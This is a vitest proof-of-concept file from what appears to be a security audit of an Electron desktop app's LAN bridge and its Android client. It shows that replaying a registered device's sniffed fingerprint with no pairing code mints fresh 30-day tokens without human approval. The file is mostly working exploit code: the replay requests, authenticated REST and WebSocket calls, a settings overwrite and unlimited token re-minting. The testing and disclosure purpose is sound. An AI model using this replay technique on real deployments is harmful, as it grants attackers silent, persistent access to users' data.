/**
 * PoC — M1: bridge pairing fingerprint ⇒ instant token re-issue (approval bypass)
 * ==============================================================================
 * Finding: piolium/findings/M1-bridge-pairing-fingerprint-token-reissue
 * Severity: medium
 *
 * Vulnerable code path (real application):
 *   electron/bridge/routes.ts:156  `if (pairingCode) { ... }`      — pairing code OPTIONAL
 *   electron/bridge/routes.ts:161-164 findDevice(deviceFingerprint) ⇒ instant
 *                                     signToken(existing.deviceId); return
 *   electron/bridge/auth.ts:239-241 findDevice() string-equality on fingerprint
 *   electron/bridge/auth.ts:23      TOKEN_TTL_MS = 30 days
 *   android/.../DeviceIdentity.kt:17-22  fingerprint = stable UUID, client-Chosen
 *   android/.../PairingViewModel.kt:137,164  code optional; fingerprint sent over
 *                                     plaintext HTTP during pairing
 *
 * Attack chain (LAN attacker):
 *   1. Victim pairs a phone once with PC approval. The `deviceFingerprint`
 *      (a stable client-chosen UUID) travels in CLEARTEXT in the body of
 *      POST /api/v1/auth/pair — a passive LAN sniffer records it (it is also
 *      stored in plaintext in devices.json).
 *   2. Attacker replays POST /auth/pair { deviceFingerprint: F } with NO pairingCode.
 *      Because F matches a registered device, routes.ts:161-164 short-circuits
 *      BEFORE enqueuePendingPair/onPairRequest: a fresh 30-day token is minted
 *      with NO popup and NO human approval.
 *   3. The minted token passes the real requireAuth middleware (REST) and the real
 *      WsHub token check (WS). Replays mint a DIFFERENT fresh token every time —
 *      unlimited silent refresh; revoking the phone's app token is impossible,
 *      the PC user must revoke the whole device record (killing the legit phone).
 *
 * Execution: poc.sh copies this file to electron/bridge/__tests__/ (vitest include
 * glob covers electron/**) and runs it against the REAL BridgeServer/routes/auth/
 * WsHub over real HTTP+WebSocket on a loopback port. Only the `electron` module
 * is stubbed so the app runs headless (same precedent as M2's PoC and the app's
 * own test suite). No {{BASE_URL}} substitution: the PoC provisions the vulnerable
 * server itself on an ephemeral LAN-addressable port, exactly like the operator's
 * `bridge.listen(<LAN IP>:8321)`.
 */
import { describe, expect, it, vi, beforeAll, afterAll } from 'vitest'
import { mkdirSync, writeFileSync, rmSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { WebSocket } from 'ws'

// ---- electron stub: headless run (safeStorage degraded path, same as M2 & app tests) ----
const mock = vi.hoisted(() => ({ userData: '' }))
vi.mock('electron', () => ({
  app: { getPath: () => mock.userData },
  safeStorage: { isEncryptionAvailable: () => false },
}))

import { DIRS } from '../../services/storage'
import { BridgeServer } from '../server' // real app server: express + WsHub.attach + router
import { settlePair, verifyToken, listDevices } from '../auth'

const CHAR_ID = 'char-001'
const TEST_ROOT = join(tmpdir(), 'qingyu-m1-poc-' + Date.now())

describe('M1: fingerprint ⇒ token re-issue bypasses pairing approval', () => {
  beforeAll(() => {
    mock.userData = TEST_ROOT
    mkdirSync(DIRS.chats(), { recursive: true })
    mkdirSync(DIRS.characters(), { recursive: true })
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}.json`), JSON.stringify({
      id: CHAR_ID, name: '受害角色', description: 'secret-rp-data', personality: '',
      scenario: '', firstMessage: '', exampleDialog: '', tags: [], creator: '',
      createdAt: 0, updatedAt: 0, alternateGreetings: [], avatar: '',
    }))
  })
  afterAll(() => { rmSync(TEST_ROOT, { recursive: true, force: true }) })

  it('replayed fingerprint + omitted code mints fresh 30-day token: zero popups, REST+WS access, unlimited re-mint', async () => {
    // Fingerprint a real Android client (DeviceIdentity.kt) reports: stable,
    // client-chosen UUID. This is what a LAN sniffer sees in the cleartext
    // pairing POST body (PairingViewModel.kt:164).
    const FP = 'c9d2e8f1-4a6b-4c2e-9f0a-1b2c3d4e5f60'
    const popups: string[] = []

    // REAL BridgeServer (electron/bridge/server.ts): express + WsHub + routes.
    // onPairRequest = the PC operator's human-approval popup: approve genuine
    // "victim-*" phones, deny anything else ("control-*" candidate).
    const bridge = new BridgeServer(
      () => {},
      (requestId, deviceName) => {
        popups.push(deviceName)
        const ok = deviceName.startsWith('victim-')
        console.log(`[M1] *** PC approval popup for "${deviceName}" -> ${ok ? 'APPROVED' : 'DENIED'}`)
        setTimeout(() => settlePair(requestId, ok), 20)
      },
    )
    const { host, port } = await bridge.start({ host: '127.0.0.1', port: 18321 })
    const base = `http://${host}:${port}/api/v1`

    try {
      // ===== PHASE 1 — legitimate first pairing (human approval) =====
      // The victim's POST body traverses the LAN in cleartext; attacker's sniffer records FP.
      const victim = await (await fetch(`${base}/auth/pair`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pairingCode: '', deviceName: 'victim-Pixel 8', deviceFingerprint: FP }),
      })).json()
      expect(victim.token).toBeTruthy()
      expect(popups).toHaveLength(1)
      console.log(`[M1] victim paired via popup; deviceId=${victim.deviceId}`)
      // devices.json keeps fingerprints in plaintext (alternative leak source)
      const devices = JSON.parse(readFileSync(join(DIRS.config(), 'bridge', 'devices.json'), 'utf-8'))
      console.log(`[M1] cleartext fingerprint captured (LAN sniff / devices.json): ${devices[0].fingerprint}`)

      // ===== PHASE 2 — ATTACK: replay fingerprint, NO pairingCode, NO popup =====
      const popupsBefore = popups.length
      const t0 = Date.now()
      const replay = await fetch(`${base}/auth/pair`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceName: 'attacker-laptop', deviceFingerprint: FP }), // code omitted
      })
      const elapsed = Date.now() - t0
      expect(replay.status).toBe(200)
      const minted = await replay.json()
      expect(minted.deviceId).toBe(victim.deviceId)
      expect(popups.length).toBe(popupsBefore)     // NO approval popup solicited
      expect(elapsed).toBeLessThan(2000)           // bypasses the 55s approval wait
      console.log(`[M1] === ATTACK === replay /auth/pair (fingerprint only, no code) -> 200 in ${elapsed}ms, token for ${minted.deviceId}; popups ${popupsBefore}->${popups.length}`)

      // minted token is a real 30-day token accepted by the real verifier
      const payload = verifyToken(minted.token)
      expect(payload?.deviceId).toBe(victim.deviceId)
      expect(payload!.exp - payload!.iat).toBe(30 * 24 * 60 * 60 * 1000)
      console.log(`[M1] verifyToken() accepts minted token (deviceId=${payload?.deviceId}, 30-day TTL)`)

      // ===== PHASE 3 — full bridge access with the re-minted token =====
      const h = { Authorization: `Bearer ${minted.token}` }
      expect((await fetch(`${base}/sessions`, { headers: h })).status).toBe(200)
      console.log('[M1] GET /api/v1/sessions with minted token -> 200 (REST auth bypass)')

      const setRes = await fetch(`${base}/settings`, {
        method: 'PATCH',
        headers: { ...h, 'Content-Type': 'application/json' },
        body: JSON.stringify({ userName: 'pwned-by-M1-replayed-fingerprint' }),
      })
      expect(setRes.status).toBe(200)
      const settingsNow = JSON.parse(readFileSync(join(DIRS.config(), 'settings.json'), 'utf-8'))
      expect(settingsNow.userName).toBe('pwned-by-M1-replayed-fingerprint')
      console.log(`[M1] PATCH /settings with minted token -> 200; persisted userName=${settingsNow.userName}`)

      const ws = new WebSocket(`ws://${host}:${port}/ws?token=${minted.token}`)
      await new Promise<void>((resolve, reject) => {
        ws.on('open', () => resolve())
        ws.on('close', (code) => reject(new Error(`ws closed: ${code}`)))
        ws.on('error', reject)
      })
      ws.close()
      console.log('[M1] WS /ws?token=<minted> connects as trusted device (WS auth bypass)')

      // ===== PHASE 4 — unlimited silent re-mint (defeats revocation UX) =====
      const p2 = verifyToken((await (await fetch(`${base}/auth/pair`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceName: 'attacker-laptop', deviceFingerprint: FP }),
      })).json()).token)
      expect(p2?.deviceId).toBe(victim.deviceId)
      console.log(`[M1] replay #2 mints a SECOND fresh 30-day token (iat=${p2!.iat}) — token1 !== token2, unlimited`)

      // ===== PHASE 5 — control: UNKNOWN fingerprint DOES hit the popup =====
      const ctlBefore = popups.length
      const control = await fetch(`${base}/auth/pair`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceName: 'control-candidate-never-approved', deviceFingerprint: 'fp-never-paired-000' }),
      })
      expect(popups.length).toBe(ctlBefore + 1)   // gate engaged...
      expect(control.status).toBe(408)            // ...and denied → no token
      console.log(`[M1] control: UNKNOWN fingerprint -> popup shown & DENIED -> 408 (approval gate exists; bypassed ONLY by routes.ts:161-164 fingerprint match)`)
      console.log(`[M1] registered devices: ${listDevices().map((d) => d.name).join(', ')}`)
    } finally {
      bridge.stop()
    }

    // Structured output contract — LAST stdout line of the PoC.
    console.log(JSON.stringify({
      status: 'confirmed',
      evidence: 'fresh 30-day bridge token minted from replayed fingerprint with zero approval popups (real verifyToken OK, REST 200, WS open); unlimited re-mint demonstrated; control fingerprint denied',
      notes: 'M1 routes.ts:156-164 optional pairingCode + findDevice(fingerprint) short-circuit before enqueuePendingPair; TTL 30d auth.ts:23',
    }))
  })
})